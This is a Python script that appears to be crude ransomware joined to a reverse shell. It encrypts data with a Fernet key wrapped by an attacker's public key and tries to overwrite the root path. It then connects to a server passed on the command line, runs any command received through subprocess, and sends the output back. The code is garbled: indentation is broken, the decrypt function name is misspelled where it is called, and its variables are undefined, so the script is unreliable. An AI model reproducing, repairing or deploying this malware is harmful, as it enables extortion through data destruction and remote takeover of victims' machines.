import os
import subprocess
import sys
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
import socket
from cryptography.fernet import Fernet
symmetricKey  = Fernet.generate_key()
FernetInstance = Fernet(symmetricKey)
with open("/home/usr/share/public_key.key", "rb") as key_file: 
    public_key = serialization.load_pem_public_key(key_file.read(), backend=default_backend()
        )   
        encryptedSymmetricKey = public_key.encrypt(
       symmetricKey, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None
       )
   ) 
   with open("encryptedSymmertricKey.key", "wb") as key_file:
   key_file.write(encryptedSymmetricKey)
   filePath = "/"
   with open(filePath, "rb") as file:
       file_data = file.read()
    encrypted_data = FernetInstance.encrypt(file_data)
   with open(filePath, "wb") as file:
       file.write(encrypted_data)
       SERVER_HOST = sys.argv[1]
SERVER_PORT = 43445
BUFFER_SIZE = 1024 * 512 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))
# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())
while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "decrypt":
        decryptFileSystem(encryptedSymmetricKey)
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
# close client connection
    s.close()
           
       def decryptFilesystem(encryptedSymmetricKey):
           FernetInstance.decrypt(file_data)
         with open(filePath, "wb") as file:
       file.write(unencrypted_data)
         break
   quit()
   

   
